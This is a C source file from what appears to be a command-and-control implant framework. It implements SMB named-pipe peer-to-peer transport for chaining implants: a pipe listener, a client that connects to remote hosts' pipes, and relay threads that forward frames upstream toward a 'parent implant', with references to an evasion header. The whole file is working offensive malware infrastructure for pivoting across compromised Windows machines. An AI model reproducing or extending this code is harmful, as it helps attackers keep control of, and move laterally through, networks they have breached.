/**
 * pipe.c - SMB Named Pipe P2P transport for implant chaining
 */
#ifdef _WIN32

#include <windows.h>
#include <stdio.h>
#include "../../include/config.h"
#include "../../include/pivot.h"
#include "../../include/p2p_relay.h"
#include "../../include/evasion.h"

#define MAX_P2P_CONNS  8
#define P2P_PIPE_BUF   65536

typedef struct {
    HANDLE hPipe;
    HANDLE hThread;
    BOOL   active;
    char   pipe_name[256];
    char   peer_id[P2P_ID_MAX];
} P2P_CONN;

static P2P_CONN g_p2p_conns[MAX_P2P_CONNS];
static HANDLE   g_p2p_listen_thread = NULL;
static BOOL     g_p2p_listening = FALSE;
static char     g_p2p_pipe_name[256] = {0};

static DWORD WINAPI p2p_relay_thread(LPVOID param) {
    P2P_CONN *conn = (P2P_CONN *)param;
    BYTE buf[P2P_PIPE_BUF];
    DWORD bytesRead;

    while (conn->active) {
        if (ReadFile(conn->hPipe, buf, sizeof(buf), &bytesRead, NULL)) {
            if (bytesRead > 0) {
                if (!p2p_relay_process(conn->hPipe, INVALID_SOCKET,
                                       P2P_TRANSPORT_PIPE, buf, bytesRead)) {
                    /* Not a routed frame; treat as raw upstream if configured */
                }
            }
        } else {
            break;
        }
    }

    if (conn->peer_id[0])
        p2p_route_remove(conn->peer_id);

    DisconnectNamedPipe(conn->hPipe);
    CloseHandle(conn->hPipe);
    conn->hPipe = INVALID_HANDLE_VALUE;
    conn->active = FALSE;
    return 0;
}

static DWORD WINAPI p2p_listen_thread(LPVOID param) {
    (void)param;

    while (g_p2p_listening) {
        HANDLE hPipe = CreateNamedPipeA(
            g_p2p_pipe_name,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            MAX_P2P_CONNS,
            P2P_PIPE_BUF, P2P_PIPE_BUF,
            0, NULL);

        if (hPipe == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }

        if (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            int slot = -1;
            for (int i = 0; i < MAX_P2P_CONNS; i++) {
                if (!g_p2p_conns[i].active) {
                    slot = i;
                    break;
                }
            }
            if (slot >= 0) {
                g_p2p_conns[slot].hPipe = hPipe;
                g_p2p_conns[slot].active = TRUE;
                g_p2p_conns[slot].peer_id[0] = '\0';
                lstrcpynA(g_p2p_conns[slot].pipe_name, g_p2p_pipe_name,
                          sizeof(g_p2p_conns[slot].pipe_name));
                g_p2p_conns[slot].hThread = jager_create_thread(
                    NULL, 0, p2p_relay_thread, &g_p2p_conns[slot], 0, NULL);
            } else {
                CloseHandle(hPipe);
            }
        } else {
            CloseHandle(hPipe);
        }
    }
    return 0;
}

BOOL p2p_listen(const char *pipe_name) {
    if (g_p2p_listening) return TRUE;

    if (pipe_name && pipe_name[0]) {
        lstrcpynA(g_p2p_pipe_name, pipe_name, sizeof(g_p2p_pipe_name));
    } else {
        _snprintf(g_p2p_pipe_name, sizeof(g_p2p_pipe_name), "\\\\.\\pipe\\%s", PIPE_NAME);
    }

    memset(g_p2p_conns, 0, sizeof(g_p2p_conns));
    g_p2p_listening = TRUE;
    g_p2p_listen_thread = jager_create_thread(NULL, 0, p2p_listen_thread, NULL, 0, NULL);
    return g_p2p_listen_thread != NULL;
}

BOOL p2p_connect(const char *target_host, const char *pipe_name) {
    char full_pipe[512];
    if (pipe_name && pipe_name[0]) {
        if (pipe_name[0] == '\\')
            lstrcpynA(full_pipe, pipe_name, sizeof(full_pipe));
        else
            _snprintf(full_pipe, sizeof(full_pipe), "\\\\%s\\pipe\\%s", target_host, pipe_name);
    } else {
        _snprintf(full_pipe, sizeof(full_pipe), "\\\\%s\\pipe\\%s", target_host, PIPE_NAME);
    }

    HANDLE hPipe = CreateFileA(
        full_pipe, GENERIC_READ | GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;

    int slot = -1;
    for (int i = 0; i < MAX_P2P_CONNS; i++) {
        if (!g_p2p_conns[i].active) {
            slot = i;
            break;
        }
    }

    if (slot < 0) {
        CloseHandle(hPipe);
        return FALSE;
    }

    g_p2p_conns[slot].hPipe = hPipe;
    g_p2p_conns[slot].active = TRUE;
    g_p2p_conns[slot].peer_id[0] = '\0';
    lstrcpynA(g_p2p_conns[slot].pipe_name, full_pipe, sizeof(g_p2p_conns[slot].pipe_name));

    /* Upstream toward parent implant for multi-hop relay */
    p2p_relay_set_upstream(hPipe, INVALID_SOCKET, P2P_TRANSPORT_PIPE);

    g_p2p_conns[slot].hThread = jager_create_thread(
        NULL, 0, p2p_relay_thread, &g_p2p_conns[slot], 0, NULL);

    return TRUE;
}

int p2p_get_active_count(void) {
    int count = 0;
    for (int i = 0; i < MAX_P2P_CONNS; i++) {
        if (g_p2p_conns[i].active) count++;
    }
    return count;
}

#else
#include "../../include/pivot.h"
BOOL p2p_listen(const char *pipe_name) { (void)pipe_name; return 0; }
BOOL p2p_connect(const char *target_host, const char *pipe_name) {
    (void)target_host; (void)pipe_name; return 0;
}
int  p2p_get_active_count(void) { return 0; }
#endif
